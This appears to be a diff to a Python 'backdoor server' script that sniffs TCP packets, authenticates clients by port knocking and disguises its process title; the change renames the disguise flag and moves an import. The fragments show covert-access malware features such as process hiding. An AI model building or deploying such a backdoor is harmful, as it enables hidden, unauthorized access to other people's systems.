@@ -19,7 +19,6 @@
 #   back and forth between the client and backdoor.
 # ========================================================================
 import time
-import setproctitle
 import base64
 import argparse
 import logging
@@ -196,8 +195,9 @@ def port_knock_auth(packet):
 #           backdoor receives is sent to port_knock_auth().
 # ========================================================================
 def main():
-    if(args.hide is not None):
-        setproctitle.setproctitle(args.hide)
+    if(args.pname is not None):
+        import setproctitle
+        setproctitle.setproctitle(args.pname)
     print("Sniffing for traffic...")
     if(args.iface is None):
         sniff(filter="tcp", prn=port_knock_auth)
@@ -208,7 +208,7 @@ def main():
 if __name__ == '__main__':
     verify_root()
     parser = argparse.ArgumentParser("Python backdoor server")
-    parser.add_argument("-h", "--hide", help="Disguise process title")
+    parser.add_argument("-p", "--pname", help="Disguise process title")
     parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
     args = parser.parse_args()
     try:
